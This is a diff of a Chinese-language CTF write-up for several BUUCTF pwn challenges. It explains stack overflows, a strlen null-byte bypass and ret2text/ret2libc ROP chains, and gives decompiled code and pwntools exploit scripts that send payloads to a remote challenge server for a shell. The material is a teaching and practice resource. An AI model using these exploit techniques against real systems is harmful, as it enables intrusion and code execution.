@@ -11,7 +11,7 @@ io.interactive()
 ```
 
 # 0x01 rip
-### ans
+### ans ret2text  
 gets()函数的简单栈溢出，没有任何保护。  
 选择栈溢出覆盖 $rip 为后门函数地址。
 ### tips
@@ -23,7 +23,7 @@ gets()函数的简单栈溢出，没有任何保护。
 由于栈对齐的原因，本次选择修改后门函数的地址 0x401186 --> 0x40118A 。  
 不使用后门函数的开始地址，直接使用 system 函数前的地址。
 
-```c
+```c++
 .text:0000000000401186                 public fun             // 不用这里
 .text:0000000000401186 fun             proc near
 .text:0000000000401186 ; __unwind {
@@ -57,7 +57,7 @@ io.interactive()
 ```
 
 ## 0x02 warmup_csaw_2016
-### ans
+### ans  ret2text
 和上面一题考点相同  
 这次后门函数的地址由程序直接输出。
 gets()函数的简单栈溢出，没有任何保护。  
@@ -82,7 +82,42 @@ io.interactive()
 ```
 
 ## 0x03 pwn1_sctf_2016
-### ans
+### ans  ret2text
+```c++
+int vuln()
+{
+  const char *v0; // eax
+  char s; // [esp+1Ch] [ebp-3Ch]  // 这里0x3C是偏移
+  char v3; // [esp+3Ch] [ebp-1Ch]
+  char v4; // [esp+40h] [ebp-18h]
+  char v5; // [esp+47h] [ebp-11h]
+  char v6; // [esp+48h] [ebp-10h]
+  char v7; // [esp+4Fh] [ebp-9h]
+
+  printf("Tell me something about yourself: ");
+  fgets(&s, 32, edata);
+  std::string::operator=(&input, &s);
+  std::allocator<char>::allocator(&v5);
+  std::string::string(&v4, "you", &v5);
+  std::allocator<char>::allocator(&v7);
+  std::string::string(&v6, "I", &v7);
+  replace((std::string *)&v3);
+  std::string::operator=(&input, &v3, &v6, &v4);
+  std::string::~string((std::string *)&v3);
+  std::string::~string((std::string *)&v6);
+  std::allocator<char>::~allocator(&v7);
+  std::string::~string((std::string *)&v4);
+  std::allocator<char>::~allocator(&v5);
+  v0 = (const char *)std::string::c_str((std::string *)&input);
+  strcpy(&s, v0);
+  return printf("So, %s\n", &s);
+}
+```
+存在溢出点的是s这个变量，偏移是0x3C（10进制的60）。  
+但是fgets的长度限制在了32。怎么办呢？  
+程序把输入的 “I” 都替换成了 “you”  
+当输入20个“I”的时候就变成了20个“you”，这样长度就变成60了。  
+溢出就在这里出现了。
 
 ### exp
 ```python
@@ -93,14 +128,44 @@ context.log_level = "debug"
 io = remote('node3.buuoj.cn','25120')
 
 shell = 0x08048F0D
-payload = "I" * 20 + "a" * 4 + p32(shell)
-
+payload = "I" * 20 + "a" * 4 + p32(shell) 
+# 0x3c+4 == 3*20+4 
 io.sendline(payload)
 io.interactive()
 
 ```
 ## 0x04 ciscn_2019_n_1
-### ans
+### ans  
+```c++
+  int result; // eax
+  char v1; // [rsp+0h] [rbp-30h]
+  float v2; // [rsp+2Ch] [rbp-4h]
+
+  v2 = 0.0;
+  puts("Let's guess the number.");
+  gets(&v1); //溢出点
+  if ( v2 == 11.28125 )
+    result = system("cat /flag");
+```
+通过gets函数把v2覆盖，使其通过if的验证。
+
+```c++
+.text:00000000004006B5                 ucomiss xmm0, cs:dword_4007F4
+.text:00000000004006BC                 jnz     short loc_4006CF
+.text:00000000004006BE                 mov     edi, offset command ; "cat /flag"
+.text:00000000004006C3                 mov     eax, 0
+.text:00000000004006C8                 call    _system
+```
+查看该段函数的汇编，在 if 的判断条件中找到对应的 11.28125 的浮点数表示。  
+应该是会 jnz 命令前的一句中出现。  
+点进 cs:dword_4007F4 中查看，如下图： 
+
+```c++
+.rodata:00000000004007F4 dword_4007F4    dd 41348000h            ; DATA XREF: func+31↑r
+.rodata:00000000004007F4                                         ; func+3F↑r
+```
+0x4007F4 处写着41348000h 这就是 11.28125 的浮点数表示。  
+
 ### exp
 ```python
 from pwn import *
@@ -116,8 +181,63 @@ payload = v1 + p64(v2)
 io.sendline(payload)
 io.interactive()
 ```
+
 ## 0x05 ciscn_2019_c_1
-### ans
+### ans  ret2libc
+
+```c++
+  puts("Input your Plaintext to be encrypted");
+  gets(s); // 溢出点
+```
+在程序的 encrypt()函数中找到栈溢出。  
+本次溢出没有 system 可以利用，所以需要使用 ret2libc 方法。  
+
+两次利用栈溢出：  
+
+第一次泄露任意一个函数地址，计算 libc 基址，确定 system 和 binsh 字符串的地址。覆盖 $rip 为 puts_plt 地址，调用 puts 函数输出 puts 函数的地址。
+- 泄露过程由两部分组成
+     1. 输出函数： 用来泄露函数地址，这里选择 puts 函数为输出函数。
+     2. 被泄露的函数地址：可以是任意的、已经使用过的函数地址，这里还是选择 puts 函数。  
+
+第二次是利用栈溢出 getshell ，与 ret2text 相同。  
+
+
+总结为两个步骤：
+1.  puts (puts_addr)
+2.  system("/bin/sh")
+
+### tips 栈布局
+
+32位与64位下的参数调用是不同的  
+32位利用栈传递参数  
+64位利用寄存器和栈传递参数  
+
+
+32位 rop 链构造：
+func(arg1,arg2,...)| 
+---|
+func |
+ret_addr |
+arg1 |
+arg2 |
+... |
+
+
+64位 rop 链构造：
+func(arg1,arg2,...)| 
+---|
+gadget1   (pop rdi;ret)|
+arg1 |
+gadget2  (pop rsi;ret) |
+arg2 |
+... |
+func |
+
+
+
+详见 ctf-wiki
+
+
 ### exp
 ```python
 from pwn import *
@@ -179,7 +299,39 @@ io.recvline()
 io.close()
 ```
 ## 0x06 [OGeek2019]babyrop
-### ans
+### ans ret2libc
+
+首先是绕过验证：
+```c++
+  memset(&s, 0, 0x20u);
+  memset(buf, 0, 0x20u);
+  sprintf(&s, "%ld", a1);
+  v6 = read(0, buf, 0x20u);
+  buf[v6 - 1] = 0;
+  v1 = strlen(buf);
+  if ( strncmp(buf, &s, v1) )
+    exit(0);
+  write(1, "Correct\n", 8u);
+  return v5;
+```
+strlen() 函数是通过 '\x00' 来判断字符串的结束的。  
+所以把输入字符串的第一个字符写为 '\x00' 就可绕过验证。
+
+```c++
+ if ( a1 == 127 )
+    result = read(0, &buf, 0xC8u);
+  else
+    result = read(0, &buf, a1); // 溢出点
+```
+这里的 a1 就是之前输入的 buf 的大小。  
+我们希望它越大越好，这样才能造成溢出。  
+所以输入为 '\x00' + '\xff' * 7
+
+
+绕过验证后，就是32位下的ret2libc
+1. write(1,write_addr,8)
+2. system("/bin/sh")
+
 ### exp
 ```python
 from pwn import *
